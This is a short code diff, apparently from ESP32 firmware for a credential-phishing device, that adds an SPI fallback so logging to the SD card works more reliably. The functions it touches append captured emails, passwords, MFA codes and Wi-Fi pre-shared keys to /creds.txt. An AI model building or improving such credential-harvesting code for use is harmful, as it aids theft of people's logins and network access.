@@ -5536,7 +5536,12 @@ static void saveCredential(const char* email, const char* password, const char* 
 
     // Append to SD card for persistent storage
     spiDeselect();
-    if (SD.begin(SD_CS)) {
+    bool sdOk = SD.begin(SD_CS);
+    if (!sdOk) {
+        SPI.begin(18, 19, 23, SD_CS);
+        sdOk = SD.begin(SD_CS, SPI, 4000000);
+    }
+    if (sdOk) {
         File f = SD.open("/creds.txt", FILE_APPEND);
         if (f) {
             f.printf("%s | %s | %s | %s\n",
@@ -5572,7 +5577,12 @@ static void updateLastCredMFA(const char* mfa) {
 // Save full PSK to SD card (no truncation — up to 63 chars)
 static void savePSKtoSD(const char* psk) {
     spiDeselect();
-    if (SD.begin(SD_CS)) {
+    bool sdOk = SD.begin(SD_CS);
+    if (!sdOk) {
+        SPI.begin(18, 19, 23, SD_CS);
+        sdOk = SD.begin(SD_CS, SPI, 4000000);
+    }
+    if (sdOk) {
         File f = SD.open("/creds.txt", FILE_APPEND);
         if (f) {
             f.printf("[PSK] %s | %s | %02X:%02X:%02X:%02X:%02X:%02X | CH%d\n",
